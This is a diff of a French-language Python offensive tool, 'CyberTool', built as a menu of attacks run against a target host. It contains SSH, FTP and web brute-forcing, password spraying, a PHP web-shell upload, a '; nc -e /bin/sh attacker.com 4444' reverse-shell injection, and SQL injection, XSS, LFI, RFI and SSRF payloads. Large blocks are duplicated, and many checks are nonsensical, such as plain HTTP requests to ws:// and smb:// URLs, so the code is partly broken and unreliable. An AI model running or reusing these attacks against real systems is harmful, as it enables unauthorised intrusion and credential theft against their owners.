-                if "api_key" in response.text or "password" in response.text:
-                    self.console.print("[⚠️] Données sensibles trouvées !", style="bold yellow")
-
-            elif feature == "user_enum":
-                self.console.print("[👤] Énumération d'utilisateurs en cours...")
-                users = ["admin", "guest", "developer"]
-                for user in users:
-                    url = f"http://{self.target}/login?username={user}"
-                    response = requests.get(url)
-                    if "user exists" in response.text:
-                        self.console.print(f"[✅] Utilisateur trouvé : {user}", style="bold green")
-
-            elif feature == "php_eval_detection":
-                self.console.print("[🖥️] Détection d'exécution de code PHP...")
-                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
-                response = requests.get(url)
-                if "PHP Version" in response.text:
-                    self.console.print("[⚠️] Code PHP exécutable détecté !", style="bold yellow")
-
-            elif feature == "hidden_service_finder":
-                self.console.print("[🔍] Recherche de services cachés...")
-                url = f"http://{self.target}/.hidden/"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Service caché détecté !", style="bold green")
-
-            elif feature == "iot_vulnerability_scan":
-                self.console.print("[🔎] Scan de vulnérabilités IoT...")
-                url = f"http://{self.target}/iot/status"
-                response = requests.get(url)
-                if "vulnerable" in response.text:
-                    self.console.print("[⚠️] Appareil IoT vulnérable détecté !", style="bold yellow")
-
-            elif feature == "tls_analysis":
-                self.console.print("[🔐] Analyse TLS et certificats en cours...")
-                url = f"https://{self.target}"
-                response = requests.get(url)
-                if "TLS" in response.text:
-                    self.console.print("[✅] Analyse TLS complète !", style="bold green")
-
-            elif feature == "dns_takeover_test":
-                self.console.print("[🌍] Test de prise de contrôle DNS...")
-                url = f"http://{self.target}/dns_test"
-                response = requests.get(url)
-                if "DNS vulnerable" in response.text:
-                    self.console.print("[⚠️] Risque de takeover DNS détecté !", style="bold yellow")
-
-            elif feature == "cloudflare_bypass":
-                self.console.print("[☁️] Test de contournement Cloudflare...")
-                url = f"http://{self.target}/real-ip"
-                response = requests.get(url)
-                if "origin IP" in response.text:
-                    self.console.print("[✅] Contournement Cloudflare réussi !", style="bold green")
-
-            elif feature == "websocket_scan":
-                self.console.print("[🔗] Scan des WebSockets en cours...")
-                url = f"ws://{self.target}/ws"
-                response = requests.get(url)
-                if response.status_code == 101:
-                    self.console.print("[✅] WebSocket détecté !", style="bold green")
-
-            elif feature == "web_fingerprint":
-                self.console.print("[🖥️] Fingerprinting Web en cours...")
-                url = f"http://{self.target}/fingerprint"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Technologies détectées !", style="bold green")
-
-            elif feature == "cdn_detection":
-                self.console.print("[📡] Détection de CDN en cours...")
-                url = f"http://{self.target}/cdn-check"
-                response = requests.get(url)
-                if "CDN detected" in response.text:
-                    self.console.print("[✅] CDN en usage !", style="bold green")
-
-            elif feature == "ssh_bruteforce":
-                self.console.print("[🔑] Bruteforce SSH en cours...")
-                attempts = ["admin:admin", "root:toor", "user:password"]
-                for attempt in attempts:
-                    user, pwd = attempt.split(":")
-                    if ssh_bruteforce(self.target, user, pwd):
-                        self.console.print(f"[✅] Accès SSH obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "ftp_bruteforce":
-                self.console.print("[🔑] Bruteforce FTP en cours...")
-                attempts = ["admin:admin", "root:toor", "user:password"]
-                for attempt in attempts:
-                    user, pwd = attempt.split(":")
-                    if ftp_bruteforce(self.target, user, pwd):
-                        self.console.print(f"[✅] Accès FTP obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "smb_enum":
-                self.console.print("[📂] Énumération SMB en cours...")
-                url = f"smb://{self.target}"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Partages SMB détectés !", style="bold green")
-
-            elif feature == "docker_registry_scan":
-                self.console.print("[🐳] Scan du registre Docker en cours...")
-                url = f"http://{self.target}:5000/v2/_catalog"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Registre Docker accessible !", style="bold green")
-
-            elif feature == "kubernetes_enum":
-                self.console.print("[☸️] Énumération Kubernetes en cours...")
-                url = f"http://{self.target}:8001/api/v1/namespaces"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] API Kubernetes accessible !", style="bold green")
-
-            elif feature == "file_upload_test":
-                self.console.print("[📂] Test de téléchargement de fichiers en cours...")
-                url = f"http://{self.target}/upload.php"
-                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
-                response = requests.post(url, files=files)
-                if response.status_code == 200:
-                    self.console.print("[⚠️] Upload de fichier PHP possible !", style="bold yellow")
-
-            elif feature == "reverse_shell_check":
-                self.console.print("[🔁] Vérification de Reverse Shell...")
-                url = f"http://{self.target}/shell.php?cmd=id"
-                response = requests.get(url)
-                if "uid=" in response.text:
-                    self.console.print("[⚠️] Reverse Shell actif !", style="bold yellow")
-
-            elif feature == "password_spray":
-                self.console.print("[🔓] Test de Password Spraying...")
-                users = ["admin", "root", "user"]
-                passwords = ["password", "123456", "admin"]
-                for user in users:
-                    for pwd in passwords:
-                        url = f"http://{self.target}/login"
-                        response = requests.post(url, data={"username": user, "password": pwd})
-                        if "Welcome" in response.text:
-                            self.console.print(f"[✅] Accès obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "waf_detection":
-                self.console.print("[🛡️] Détection de Web Application Firewall...")
-                url = f"http://{self.target}"
-                headers = {"User-Agent": "WAF-Scanner"}
-                response = requests.get(url, headers=headers)
-                if "403 Forbidden" in response.text:
-                    self.console.print("[⚠️] WAF détecté sur la cible !", style="bold yellow")
-
-            elif feature == "api_rate_limit_test":
-                self.console.print("[🔄] Test de limitations d'API en cours...")
-                url = f"http://{self.target}/api/v1/test"
-                for _ in range(10):
-                    response = requests.get(url)
-                    if response.status_code == 429:
-                        self.console.print("[⚠️] Limite de requêtes API atteinte !", style="bold yellow")
-                        break
-
-            elif feature == "websocket_scan":
-                self.console.print("[🔗] Scan des WebSockets en cours...")
-                url = f"ws://{self.target}/ws"
-                response = requests.get(url)
-                if response.status_code == 101:
-                    self.console.print("[✅] WebSocket détecté !", style="bold green")
-
-            elif feature == "web_fingerprint":
-                self.console.print("[🖥️] Fingerprinting Web en cours...")
-                url = f"http://{self.target}/fingerprint"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Technologies détectées !", style="bold green")
-
-            elif feature == "cdn_detection":
-                self.console.print("[📡] Détection de CDN en cours...")
-                url = f"http://{self.target}/cdn-check"
-                response = requests.get(url)
-                if "CDN detected" in response.text:
-                    self.console.print("[✅] CDN en usage !", style="bold green")
-
-            elif feature == "ssh_bruteforce":
-                self.console.print("[🔑] Bruteforce SSH en cours...")
-                attempts = ["admin:admin", "root:toor", "user:password"]
-                for attempt in attempts:
-                    user, pwd = attempt.split(":")
-                    if ssh_bruteforce(self.target, user, pwd):
-                        self.console.print(f"[✅] Accès SSH obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "ftp_bruteforce":
-                self.console.print("[🔑] Bruteforce FTP en cours...")
-                attempts = ["admin:admin", "root:toor", "user:password"]
-                for attempt in attempts:
-                    user, pwd = attempt.split(":")
-                    if ftp_bruteforce(self.target, user, pwd):
-                        self.console.print(f"[✅] Accès FTP obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "smb_enum":
-                self.console.print("[📂] Énumération SMB en cours...")
-                url = f"smb://{self.target}"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Partages SMB détectés !", style="bold green")
-
-            elif feature == "docker_registry_scan":
-                self.console.print("[🐳] Scan du registre Docker en cours...")
-                url = f"http://{self.target}:5000/v2/_catalog"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Registre Docker accessible !", style="bold green")
-
-            elif feature == "kubernetes_enum":
-                self.console.print("[☸️] Énumération Kubernetes en cours...")
-                url = f"http://{self.target}:8001/api/v1/namespaces"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] API Kubernetes accessible !", style="bold green")
-
-            elif feature == "file_upload_test":
-                self.console.print("[📂] Test de téléchargement de fichiers en cours...")
-                url = f"http://{self.target}/upload.php"
-                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
-                response = requests.post(url, files=files)
-                if response.status_code == 200:
-                    self.console.print("[⚠️] Upload de fichier PHP possible !", style="bold yellow")
-
-            elif feature == "reverse_shell_check":
-                self.console.print("[🔁] Vérification de Reverse Shell...")
-                url = f"http://{self.target}/shell.php?cmd=id"
-                response = requests.get(url)
-                if "uid=" in response.text:
-                    self.console.print("[⚠️] Reverse Shell actif !", style="bold yellow")
-
-            elif feature == "password_spray":
-                self.console.print("[🔓] Test de Password Spraying...")
-                users = ["admin", "root", "user"]
-                passwords = ["password", "123456", "admin"]
-                for user in users:
-                    for pwd in passwords:
-                        url = f"http://{self.target}/login"
-                        response = requests.post(url, data={"username": user, "password": pwd})
-                        if "Welcome" in response.text:
-                            self.console.print(f"[✅] Accès obtenu avec {user}:{pwd}", style="bold green")
-
-            elif feature == "waf_detection":
-                self.console.print("[🛡️] Détection de Web Application Firewall...")
-                url = f"http://{self.target}"
-                headers = {"User-Agent": "WAF-Scanner"}
-                response = requests.get(url, headers=headers)
-                if "403 Forbidden" in response.text:
-                    self.console.print("[⚠️] WAF détecté sur la cible !", style="bold yellow")
-
-            elif feature == "api_rate_limit_test":
-                self.console.print("[🔄] Test de limitations d'API en cours...")
-                url = f"http://{self.target}/api/v1/test"
-                for _ in range(10):
-                    response = requests.get(url)
-                    if response.status_code == 429:
-                        self.console.print("[⚠️] Limite de requêtes API atteinte !", style="bold yellow")
-                        break
-
-        self.console.print(
-            f"\n[💀] Bienvenue sur CyberTool - Cible : [bold cyan]{self.target}[/bold cyan]",
-            style="bold red"
-        )
-
-        self.display_features_table()  # ✅ Affichage propre du tableau interactif
-
-        while True:
-            choice = Prompt.ask("\n[🛠️] Entrez un numéro (1-100) ou 'valider' pour exécuter")
-
-            if choice.lower() == "valider":
-                break
-
-            try:
-                idx = int(choice) - 1
-                if 0 <= idx < len(self.feature_map):
-                    feature_key = list(self.feature_map.keys())[idx]
-                    if feature_key not in self.selected_features:
-                        self.selected_features.append(feature_key)
-                        self.console.print(f"[✅] Ajouté : {self.feature_map[feature_key]}", style="bold green")
-                    else:
-                        self.console.print(f"[⚠️] Déjà sélectionné : {self.feature_map[feature_key]}", style="bold yellow")
-                else:
-                    self.console.print("[❌] Numéro invalide !", style="bold red")
-            except ValueError:
-                self.console.print("[❌] Entrée invalide !", style="bold red")
-
-        self.console.print(f"\n[🔥] Exécution des tests sur : [bold cyan]{self.target}[/bold cyan]")
-
-        for feature in self.selected_features:
-            self.console.print(f"[🔍] Exécution de : {self.feature_map[feature]}")
-
-            # Vérification si la fonctionnalité a une version interactive
-            if feature in self.feature_map_interactive:
-                self.console.print("[⚡] Version interactive détectée, lancement en mode interactif...", style="bold yellow")
-                self.feature_map_interactive[feature](self.target)
-            else:
-                # Exécution standard si pas de version interactive
-                if feature == "dns_lookup":
-                    self.console.print("[🔍] Recherche DNS en cours...")
-                    try:
-                        ip = socket.gethostbyname(self.target)
-                        self.console.print(f"[🟢] {self.target} → {ip}", style="bold green")
-                    except socket.gaierror:
-                        self.console.print("[❌] Échec de la résolution DNS.", style="bold red")
-
-                elif feature == "port_scan":
-                    self.console.print("[🔎] Scan des ports en cours...")
-                    open_ports = []
-                    for port in [21, 22, 25, 53, 80, 443, 8080]:
-                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                            s.settimeout(1)
-                            if s.connect_ex((self.target, port)) == 0:
-                                open_ports.append(port)
-                    self.console.print(f"[✅] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")
-
-                # Ajoute ici la suite des fonctionnalités normales (déjà intégrées)
-
-
-
-
-
-
-
-
-    def display_features_table(self):
-        """📊 Affichage interactif des fonctionnalités sous forme de tableau"""
-
-        table = Table(title="🛠️ CyberTool - Fonctionnalités Disponibles", style="bold cyan")
-
-        table.add_column("#", justify="center", style="bold white", no_wrap=True)
-        table.add_column("Nom de la Fonctionnalité", style="bold magenta")
-        table.add_column("Mode", style="bold yellow")
-
-        for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
-            mode = "[⚡] Interactive" if feature in self.feature_map_interactive else "[🛠️] Standard"
-            table.add_row(str(idx), description, mode)
-
-        self.console.print(table)
-
-    def generate_file_name(self, category="cybertool", extension="txt"):
-        """📂 Génération d'un nom de fichier unique basé sur la catégorie"""
-        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-        return f"{category}_{random_suffix}.{extension}"
-
-    def save_results_to_file(self, filename, data):
-        """📂 Sauvegarde les résultats dans un fichier"""
-        with open(filename, "w", encoding="utf-8") as file:
-            file.write(data)
-
-    def get_http_response(self, url):
-        """🌐 Récupère la réponse HTTP d'une URL"""
+    def dns_lookup(self, target):
+        """📡 Résolution DNS avec gestion des erreurs"""
         try:
-            response = requests.get(url, timeout=5)
-            return response.status_code, response.text[:500]  # 🔹 Retourne le code + extrait des 500 1ers caractères
-        except requests.exceptions.RequestException as e:
-            return None, f"Erreur lors de la requête : {e}"
+            ip = socket.gethostbyname(target)
+            return {"target": target, "resolved_ip": ip}
+        except socket.gaierror:
+            return {"error": "Erreur de résolution DNS"}
 
-    def add_result(self, feature, result):
-        """📝 Ajoute un résultat au stockage global"""
-        if not hasattr(self, "results"):
-            self.results = {}  # 📌 Initialise le stockage s'il n'existe pas
+    def port_scan(self, target, ports=[21, 22, 80, 443, 3306], threads=10):
+        """🔍 Scan des ports avec multithreading"""
+        def check_port(port):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((target, port))
+            s.close()
+            return port if result == 0 else None
 
-        self.results[feature] = result
-        self.console.print(f"[💾] Résultat ajouté pour {feature} !", style="bold cyan")
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            open_ports = list(filter(None, executor.map(check_port, ports)))
 
-
-
-
-
-
-
-
+        return {"target": target, "open_ports": open_ports} if open_ports else {"target": target, "open_ports": "Aucun port ouvert détecté"}
 
 
-
-
-
-#50 50 50 50
-
-
-
-
-
-# ✅ TOP : Fonctions 1 à 5
-def dns_lookup(domain):
-    """ Résolution DNS """
-    try:
-        return socket.gethostbyname(domain)
-    except socket.gaierror:
-        return "Résolution DNS impossible."
-
-def port_scan(ip, ports=[21, 22, 80, 443, 3306]):
-    """ Scan des ports basiques """
-    open_ports = []
-    for port in ports:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        if sock.connect_ex((ip, port)) == 0:
-            open_ports.append(port)
-        sock.close()
-    return open_ports if open_ports else "Aucun port ouvert détecté."
-
-def headers_analysis(url):
-    """ Analyse des headers HTTP """
-    try:
-        response = requests.get(url, timeout=5)
-        return response.headers
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def directory_bruteforce(url, wordlist=["admin", "login", "dashboard"]):
-    """ Brute-force de répertoires """
-    found = []
-    for word in wordlist:
-        full_url = f"{url}/{word}"
-        response = requests.get(full_url)
-        if response.status_code == 200:
-            found.append(full_url)
-    return found if found else "Aucun répertoire trouvé."
-
-def cms_detector(url):
-    """ Détection CMS """
-    try:
-        response = requests.get(url, timeout=5)
-        if "wp-content" in response.text:
-            return "WordPress détecté."
-        elif "Joomla" in response.text:
-            return "Joomla détecté."
-        elif "Drupal" in response.text:
-            return "Drupal détecté."
+    def headers_analysis(self, target):
+        """🛠️ Analyse complète des headers HTTP
+        Retourne une réponse détaillée incluant le statut, tous les headers et un échantillon du contenu.
+        """
+        # Correction de l'URL si nécessaire
+        if not target.startswith("http"):
+            url = f"http://{target}"
         else:
-            return "CMS non détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
+            url = target
 
-
-
-
-# ✅ TOP : Fonctions 6 à 10
-def subdomain_enum(domain):
-    """ Énumération des sous-domaines """
-    url = f"https://crt.sh/?q={domain}&output=json"
-    try:
-        response = requests.get(url, timeout=5)
-        return [entry["name_value"] for entry in response.json()]
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def sql_injection_test(url):
-    """ Test d'injection SQL """
-    payload = "' OR '1'='1"
-    try:
-        response = requests.get(f"{url}{payload}", timeout=5)
-        return "Possible vulnérabilité SQL détectée" if "error" in response.text.lower() else "Aucune vulnérabilité détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def ftp_bruteforce(ip, username, password):
-    """ Bruteforce FTP """
-    from ftplib import FTP
-    try:
-        ftp = FTP(ip)
-        ftp.login(user=username, passwd=password)
-        ftp.quit()
-        return "Connexion FTP réussie !"
-    except Exception as e:
-        return f"Échec FTP : {e}"
-
-def smb_enum(ip):
-    """ Énumération SMB """
-    try:
-        response = subprocess.run(["smbclient", "-L", ip, "-N"], capture_output=True, text=True, timeout=5)
-        return response.stdout if response.stdout else "Aucune information SMB trouvée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def honeypot_detection(ip):
-    """ Détection de Honeypot """
-    try:
-        response = requests.get(f"http://api.shodan.io/shodan/host/{ip}?key=YourShodanAPIKey", timeout=5)
-        return "Honeypot détecté !" if "honeypot" in response.json() else "Aucun Honeypot détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-
-# ✅ TOP : Fonctions 11 à 15
-def open_redirect_test(url):
-    """ Détection d'Open Redirect """
-    payload = "/redirect?url=https://evil.com"
-    try:
-        response = requests.get(url + payload, allow_redirects=False, timeout=5)
-        return "Vulnérabilité Open Redirect détectée !" if response.status_code in [301, 302] else "Aucune vulnérabilité détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def web_fingerprint(url):
-    """ Fingerprinting Web """
-    try:
-        response = requests.get(url, timeout=5)
-        headers = response.headers
-        techs = []
-        if "server" in headers:
-            techs.append(headers["server"])
-        if "x-powered-by" in headers:
-            techs.append(headers["x-powered-by"])
-        return techs if techs else "Aucune info détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def docker_registry_scan(ip):
-    """ Scan d'un registre Docker exposé """
-    try:
-        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
-        return response.json() if response.status_code == 200 else "Aucun registre Docker exposé détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def file_upload_test(url):
-    """ Test de vulnérabilité upload de fichier """
-    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
-    try:
-        response = requests.post(url, files=files, timeout=5)
-        return "Upload réussi, vulnérabilité possible !" if response.status_code == 200 else "Aucune vulnérabilité détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def browser_fingerprint():
-    """ Fingerprinting du navigateur """
-    try:
-        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
-        return response.json() if response.status_code == 200 else "Impossible de récupérer les infos du navigateur."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-
-# ✅ TOP : Fonctions 16 à 20
-def api_rate_limit_test(url):
-    """ Test des limitations de requêtes d’une API """
-    try:
-        for _ in range(10):
+        try:
             response = requests.get(url, timeout=5)
-        return "Aucune limitation détectée." if response.status_code == 200 else "Limite API atteinte !"
-    except Exception as e:
-        return f"Erreur : {e}"
+            headers = dict(response.headers)
+            content_sample = response.text[:1000]  # Échantillon de 1000 caractères du contenu
 
-def reverse_shell_check(url):
-    """ Vérification de présence d’un Reverse Shell """
-    payload = "; nc -e /bin/sh attacker.com 4444"
-    try:
-        response = requests.get(f"{url}{payload}", timeout=5)
-        return "Reverse shell potentiellement possible !" if response.status_code == 200 else "Aucune vulnérabilité détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
+            self.console.print(f"\n🔍 [bold cyan]Analyse complète des headers de :[/bold cyan] {url}")
+            self.console.print(f"[bold yellow]Statut HTTP :[/bold yellow] {response.status_code}")
+            self.console.print(f"[bold green]Nombre de headers :[/bold green] {len(headers)}")
+            
+            return {
+                "url": url,
+                "status_code": response.status_code,
+                "headers": headers,
+                "content_sample": content_sample
+            }
+        except requests.RequestException as e:
+            return {"error": f"Erreur lors de l'analyse complète des headers: {str(e)}"}
 
-def password_spray(url, user_list, password):
-    """ Attaque de Password Spraying """
-    valid_users = []
-    for user in user_list:
+
+
+
+    def directory_bruteforce(self, target, wordlist=None):
+        """🚪 Brute-force de répertoires"""
+        if not wordlist:
+            wordlist = ["admin", "login", "dashboard", "config", "backup"]
+
+        found_dirs = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            results = executor.map(lambda w: (w, self.get_http_response(f"http://{target}/{w}/")["status"]), wordlist)
+            for word, status in results:
+                if status == 200:
+                    found_dirs.append(f"http://{target}/{word}/")
+
+        return {"target": target, "found_directories": found_dirs} if found_dirs else {"target": target, "found_directories": "Aucun répertoire trouvé"}
+
+    def cms_detector(self, target):
+        """🖥️ Détection CMS optimisée"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        if "error" in response_data:
+            return response_data
+
+        content = response_data["content"].lower()
+        headers = response_data["headers"]
+
+        cms_signatures = {
+            "WordPress": ["wp-content", "wp-includes", "wordpress"],
+            "Drupal": ["drupal.js", "sites/all/modules"],
+            "Joomla": ["Joomla!", "com_content"]
+        }
+
+        detected_cms = [name for name, signs in cms_signatures.items() if any(s in content or s in headers for s in signs)]
+        return {"target": target, "cms_detected": detected_cms} if detected_cms else {"target": target, "cms_detected": "Aucun CMS détecté"}
+
+    def exploit_cve_scanner(self, target):
+        """⚠️ Scan des vulnérabilités CVE"""
+        url = f"https://cve.circl.lu/api/search/{target}"
+        return self.get_http_response(url)
+
+    def cloud_storage_enum(self, target):
+        """☁️ Énumération Cloud (AWS, GCP, Azure)"""
+        buckets = [
+            f"http://{target}.s3.amazonaws.com",
+            f"http://{target}.blob.core.windows.net",
+            f"http://{target}.storage.googleapis.com"
+        ]
+        available_buckets = []
+        for bucket in buckets:
+            response_data = self.get_http_response(bucket)
+            if response_data.get("status") in [200, 403]:
+                available_buckets.append({"bucket": bucket, "status": response_data["status"]})
+        return {"target": target, "cloud_buckets": available_buckets} if available_buckets else {"target": target, "cloud_buckets": "Aucun stockage Cloud détecté"}
+
+    def smart_contract_audit(self, target):
+        """📜 Audit de contrats intelligents via l'API Etherscan"""
+        etherscan_api = "https://api.etherscan.io/api"
+        url = f"{etherscan_api}?module=contract&action=getsourcecode&address={target}"
+        return self.get_http_response(url)
+
+    def xss_scanner(self, target):
+        """💀 Détection de Cross-Site Scripting (XSS)"""
+        payloads = ["<script>alert(1)</script>", "'><img src=x onerror=alert(1)>"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}?q={payload}"
+            response_data = self.get_http_response(url)
+            if payload in response_data.get("content", ""):
+                results[payload] = "Potentielle vulnérabilité XSS détectée"
+        return {"target": target, "xss_vulnerabilities": results} if results else {"target": target, "xss_vulnerabilities": "Aucune vulnérabilité XSS détectée"}
+
+    def subdomain_enum(self, target, wordlist=None):
+        """🔎 Énumération des sous-domaines"""
+        if not wordlist:
+            wordlist = ["www", "mail", "ftp", "api", "dev", "blog"]
+        subdomains = []
+        for sub in wordlist:
+            subdomain = f"{sub}.{target}"
+            try:
+                socket.gethostbyname(subdomain)
+                subdomains.append(subdomain)
+            except socket.gaierror:
+                pass
+        return {"target": target, "subdomains": subdomains} if subdomains else {"target": target, "subdomains": "Aucun sous-domaine trouvé"}
+
+
+
+    def sql_injection_test(self, target):
+        """🛑 Test basique d'injection SQL"""
+        payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}?id={payload}"
+            response_data = self.get_http_response(url)
+            content = response_data.get("content", "").lower()
+            if "error" not in response_data and ("error" in content or "syntax" in content):
+                results[payload] = "Potentielle vulnérabilité détectée"
+        return {"target": target, "sql_injection": results} if results else {"target": target, "sql_injection": "Aucune vulnérabilité détectée"}
+
+    def csrf_detection(self, target):
+        """🛡️ Détection de Cross-Site Request Forgery (CSRF)"""
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        if "error" in response_data:
+            return response_data
+        soup = BeautifulSoup(response_data.get("content", ""), "html.parser")
+        forms = soup.find_all("form")
+        csrf_protected = any("csrf" in str(form).lower() for form in forms)
+        return {"target": target, "csrf_protected": csrf_protected}
+
+    def lfi_scanner(self, target):
+        """📂 Détection de Local File Inclusion (LFI)"""
+        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}/index.php?file={payload}"
+            response_data = self.get_http_response(url)
+            content = response_data.get("content", "")
+            if "root:x" in content or "for 16-bit app support" in content:
+                results[payload] = "Potentielle vulnérabilité LFI détectée"
+        return {"target": target, "lfi_vulnerabilities": results} if results else {"target": target, "lfi_vulnerabilities": "Aucune vulnérabilité détectée"}
+
+    def rfi_scanner(self, target):
+        """🌍 Détection de Remote File Inclusion (RFI)"""
+        payloads = ["http://evil.com/shell.txt", "https://raw.githubusercontent.com/malicious/script.php"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}/index.php?file={payload}"
+            response_data = self.get_http_response(url)
+            content = response_data.get("content", "").lower()
+            if "malicious" in content or "shell" in content:
+                results[payload] = "Potentielle vulnérabilité RFI détectée"
+        return {"target": target, "rfi_vulnerabilities": results} if results else {"target": target, "rfi_vulnerabilities": "Aucune vulnérabilité détectée"}
+
+    def ssrf_scanner(self, target):
+        """🌐 Détection de Server-Side Request Forgery (SSRF)"""
+        payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}/proxy?url={payload}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") == 200:
+                results[payload] = "Potentielle vulnérabilité SSRF détectée"
+        return {"target": target, "ssrf_vulnerabilities": results} if results else {"target": target, "ssrf_vulnerabilities": "Aucune vulnérabilité détectée"}
+
+    def jwt_analysis(self, jwt_token):
+        """🔑 Analyse et décodage JWT"""
         try:
-            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
-            if response.status_code == 200:
-                valid_users.append(user)
-        except:
-            pass
-    return valid_users if valid_users else "Aucun utilisateur trouvé avec ce mot de passe."
+            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
+            return {"jwt_token": jwt_token, "decoded_payload": decoded}
+        except jwt.DecodeError:
+            return {"error": "JWT invalide"}
 
-def waf_detection(url):
-    """ Détection d'un Web Application Firewall (WAF) """
-    headers = {"User-Agent": "BadBot"}
-    try:
-        response = requests.get(url, headers=headers, timeout=5)
-        return "WAF détecté !" if response.status_code in [403, 406] else "Aucun WAF détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
+    def exposed_api_scan(self, target):
+        """🛠️ Scan des API exposées"""
+        endpoints = ["/api/v1/status", "/api/v1/users", "/api/v1/admin"]
+        results = {}
+        for endpoint in endpoints:
+            url = f"http://{target}{endpoint}"
+            response_data = self.get_http_response(url)
+            if response_data.get("status") == 200:
+                results[endpoint] = "Endpoint accessible"
+        return {"target": target, "exposed_api_endpoints": results} if results else {"target": target, "exposed_api_endpoints": "Aucun endpoint exposé"}
 
-def tls_analysis(domain):
-    """ Analyse TLS et certificats SSL """
-    try:
-        import ssl
-        cert = ssl.get_server_certificate((domain, 443))
-        return cert if cert else "Aucune information sur le certificat trouvée."
-    except Exception as e:
-        return f"Erreur : {e}"
+    def open_redirect_test(self, target):
+        """🔄 Détection d'Open Redirect"""
+        payloads = ["/redirect?url=https://evil.com", "/goto?target=https://evil.com"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}{payload}"
+            response_data = self.get_http_response(url)
+            # Ici, on vérifie si "evil.com" est présent dans le contenu (cas simplifié)
+            if "evil.com" in response_data.get("content", "").lower():
+                results[payload] = "Potentielle vulnérabilité détectée"
+        return {"target": target, "open_redirects": results} if results else {"target": target, "open_redirects": "Aucune vulnérabilité détectée"}
 
+    def sensitive_data_exposure(self, target):
+        """🔓 Détection d'exposition de données sensibles"""
+        patterns = {
+            "API Keys": r"(?i)api[_-]?key\s*=\s*[\"'][a-zA-Z0-9]+[\"']",
+            "Token JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
+            "Emails": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+        }
+        results = {}
+        url = f"http://{target}"
+        response_data = self.get_http_response(url)
+        content = response_data.get("content", "")
+        for name, pattern in patterns.items():
+            found = re.findall(pattern, content)
+            if found:
+                results[name] = found
+        return {"target": target, "sensitive_data": results} if results else {"target": target, "sensitive_data": "Aucune donnée sensible trouvée"}
 
-
-
-# ✅ TOP : Fonctions 21 à 25
-def jwt_analysis(token):
-    """ Analyse et décodage JWT """
-    try:
-        import jwt
-        decoded = jwt.decode(token, options={"verify_signature": False})
-        return decoded
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def cdn_detection(domain):
-    """ Détection de l'utilisation d'un CDN """
-    try:
-        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
-        if "cloudflare" in response.text.lower():
-            return "CDN détecté : Cloudflare"
-        return "Aucun CDN détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def metadata_extraction(file_path):
-    """ Extraction des métadonnées d’un fichier """
-    try:
-        from exif import Image
-        with open(file_path, "rb") as file:
-            img = Image(file)
-            return img.list_all() if img.has_exif else "Aucune métadonnée trouvée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def email_enum(domain):
-    """ Énumération des e-mails exposés via Hunter.io """
-    api_key = "YourHunterAPIKey"
